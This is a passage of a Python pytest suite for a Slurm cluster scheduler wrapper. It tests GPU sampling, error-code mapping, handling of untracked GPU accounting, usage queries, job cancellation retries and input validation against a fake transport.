    samples = sched.gpu_samples("4242")
    assert [s.index for s in samples] == [0, 1] and samples[0].util_percent == 97.0
    argv = fake.calls[-1]
    assert (
        argv[2:6] == ["srun", "--jobid=4242", "--overlap", "--nodes=1"]
        and "--format=csv,noheader,nounits" in argv
    )


@pytest.mark.parametrize(
    ("stderr", "code"),
    [
        (
            "srun: error: Unable to confirm allocation for job 7: Job is pending execution",
            ErrorCode.NOT_READY,
        ),
        (
            "srun: error: Unable to confirm allocation for job 7: Job/step already completing or completed",
            ErrorCode.PRECONDITION_FAILED,
        ),
        (
            "srun: error: Unable to confirm allocation for job 7: Invalid job id specified",
            ErrorCode.PRECONDITION_FAILED,
        ),
        ("slurmstepd: error: execve(): nvidia-smi: No such file or directory", ErrorCode.UNSUPPORTED),
        ("srun: error: Socket timed out on send/recv operation", ErrorCode.UNAVAILABLE),
    ],
)
def test_gpu_samples_errors(fake: FakeTransport, sched: SlurmScheduler, stderr: str, code: ErrorCode) -> None:
    fake.on("srun", "", stderr, rc=1, when=lambda a: "--overlap" in a)
    with pytest.raises(TransportError) as exc:
        sched.gpu_samples("7")
    assert exc.value.code == code


def test_gpu_samples_unsupported_without_overlap(cluster: ResolvedCluster) -> None:
    fake = FakeTransport()
    probe_ok(fake)
    fake.on("sbatch", "slurm 20.02.7\n", when=lambda a: "--version" in a)
    with pytest.raises(TransportError) as exc:
        SlurmScheduler(fake, cluster).gpu_samples("7")
    assert exc.value.code == ErrorCode.UNSUPPORTED


UNTRACKED_GPU_CONFIG = load("scontrol_show_config.txt").replace(
    "AccountingStorageTRES   = cpu,mem,energy,node,billing,fs/disk,vmem,pages,gres/gpu",
    "AccountingStorageTRES   = cpu,mem,energy,node,billing,fs/disk,vmem,pages",
)


def test_gpu_counts_are_unknown_when_accounting_does_not_track_gpus(cluster: ResolvedCluster) -> None:
    # Slurm's default AccountingStorageTRES does not include gres/gpu: TRES strings then carry
    # no GPU entry even for an 8-GPU job. "0 GPUs" would settle budgets and usage reports at
    # zero GPU-hours; the only honest answer is "unknown".
    assert "AccountingStorageTRES" in UNTRACKED_GPU_CONFIG and "gres/gpu" not in UNTRACKED_GPU_CONFIG
    fake = FakeTransport()
    probe_ok(fake, config=UNTRACKED_GPU_CONFIG)
    untracked = "billing=8,cpu=8,mem=64G,node=1"
    sacct_row = (
        load("sacct_jobs.txt")
        .splitlines()[0]
        .replace("billing=8,cpu=8,gres/gpu:h100=1,gres/gpu=1,mem=64G,node=1", untracked)
    )
    fake.on("sacct", sacct_row + "\n", when=lambda a: "--allocations" in a)
    squeue_row = (
        load("squeue_jobs.txt")
        .splitlines()[0]
        .replace("cpu=8,mem=64G,node=1,billing=8,gres/gpu=1,gres/gpu:h100=1", untracked)
    )
    fake.on("squeue", squeue_row + "\n", when=lambda a: any(x.startswith("--Format") for x in a))
    sched = SlurmScheduler(fake, cluster)
    assert sched.query_accounting(job_ids=["4242"]).jobs[0].alloc_gpus is None
    assert sched.query_queue(job_ids=["4242"]).jobs[0].alloc_gpus is None
    with pytest.raises(TransportError) as exc:
        sched.usage(account="mylab", users=None, since="2026-08-01T12:00:00Z", until=None)
    assert exc.value.code == ErrorCode.UNSUPPORTED and "gres/gpu" in exc.value.message


def test_gpu_counts_are_unknown_while_gpu_tracking_is_unknown(cluster: ResolvedCluster) -> None:
    # `scontrol show config` failed (slurmctld busy while slurmdbd answers): whether gres/gpu
    # is tracked is unknown for the partial-probe window. A 4-GPU job's AllocTRES without a
    # GPU entry must then read "unknown", not 0 - finalize would settle 0 GPU-hours from it.
    fake = FakeTransport()
    probe_ok(fake)
    fake.on("scontrol", "", "slurm_load_ctl_conf error: Unable to contact slurm controller", rc=1)
    untracked = "billing=16,cpu=16,mem=128G,node=1"
    sacct_rows = load("sacct_jobs.txt").splitlines()
    gpu_row = sacct_rows[0].replace("billing=8,cpu=8,gres/gpu:h100=1,gres/gpu=1,mem=64G,node=1", untracked)
    assert untracked in gpu_row
    fake.on("sacct", gpu_row + "\n", when=lambda a: "--allocations" in a)
    squeue_row = (
        load("squeue_jobs.txt")
        .splitlines()[0]
        .replace("cpu=8,mem=64G,node=1,billing=8,gres/gpu=1,gres/gpu:h100=1", untracked)
    )
    assert untracked in squeue_row
    fake.on("squeue", squeue_row + "\n", when=lambda a: any(x.startswith("--Format") for x in a))
    sched = SlurmScheduler(fake, cluster)
    caps = sched.probe_capabilities()
    assert caps.sacct_available and any("scontrol show config failed" in n for n in caps.notes)
    acct = sched.query_accounting(job_ids=["4242"]).jobs[0]
    assert acct.node_list is not None and acct.alloc_gpus is None
    assert sched.query_queue(job_ids=["4242"]).jobs[0].alloc_gpus is None
    # An explicit GPU entry is still exact while tracking is unknown.
    fake.on("sacct", sacct_rows[0] + "\n", when=lambda a: "--allocations" in a)
    assert sched.query_accounting(job_ids=["4242"]).jobs[0].alloc_gpus == 1


def test_gpu_counts_stay_exact_when_accounting_tracks_gpus(
    fake: FakeTransport, sched: SlurmScheduler
) -> None:
    fake.on("sacct", load("sacct_jobs.txt"), when=lambda a: "--allocations" in a)
    by_id = {j.job_id: j for j in sched.query_accounting(job_ids=["4251", "4242"]).jobs}
    assert by_id["4251"].alloc_gpus == 0  # tracked and absent: a real CPU-only job
    assert by_id["4242"].alloc_gpus == 1


def test_usage(fake: FakeTransport, sched: SlurmScheduler) -> None:
    fake.on("sacct", load("sacct_usage.txt"), when=lambda a: "--allocations" in a)
    rows = sched.usage(
        account="mylab", users=None, since="2026-08-01T12:00:00Z", until="2026-08-31T12:00:00Z"
    )
    argv = fake.calls[-1]
    assert "--allusers" in argv and "--accounts=mylab" in argv
    assert f"--starttime=now-{31 * 86400}" in argv and f"--endtime=now-{86400}" in argv
    assert [(r.job_id, r.user, r.gpus, r.elapsed_s, r.state) for r in rows] == [
        ("4242", "jdoe", 2, 3600, "COMPLETED"),
        ("4248", "alice", 0, 0, "PENDING"),
        ("4300_3", "bob", 4, 500, "CANCELLED"),
    ]
    sched.usage(account=None, users=["alice", "bob"], since="2026-08-31T12:00:00Z", until=None)
    argv = fake.calls[-1]
    assert (
        "--user=alice,bob" in argv
        and "--allusers" not in argv
        and not any(a.startswith("--endtime") for a in argv)
    )


def test_cancel(fake: FakeTransport, sched: SlurmScheduler) -> None:
    fake.on("scancel", "")
    resp = sched.cancel("4242")
    assert resp.accepted and fake.calls[-1] == [*ENV, "scancel", "4242"]
    fake.on(
        "scancel",
        "",
        "scancel: error: Kill job error on job id 4242: Job/step already completing or completed",
        rc=1,
    )
    resp = sched.cancel("4242")
    assert not resp.accepted and "already completing" in resp.raw
    with pytest.raises(InvalidArgument):
        sched.cancel("4242 4243")


@pytest.mark.parametrize(
    "stderr",
    [
        "scancel: error: Kill job error on job id 4242: Socket timed out on send/recv operation",
        "scancel: error: Kill job error on job id 4242: Unable to contact slurm controller (connect failure)",
    ],
)
def test_cancel_communication_failure_is_retryable_not_refused(
    fake: FakeTransport, sched: SlurmScheduler, stderr: str
) -> None:
    # An overloaded controller is not a "no": reporting accepted=False would record the cancel
    # as failed and leave an 8-GPU job burning; a retryable error lets the outbox try again.
    fake.on("scancel", "", stderr, rc=1)
    with pytest.raises(ConnectionLost) as exc:
        sched.cancel("4242")
    assert exc.value.retryable and exc.value.maybe_executed


def test_usage_rejects_malformed_window_bounds(sched: SlurmScheduler) -> None:
    with pytest.raises(InvalidArgument):
        sched.usage(account=None, users=None, since="2026-08-01T12:00:00Z", until="last tuesday")
    with pytest.raises(InvalidArgument):
        sched.usage(account=None, users=None, since="", until=None)
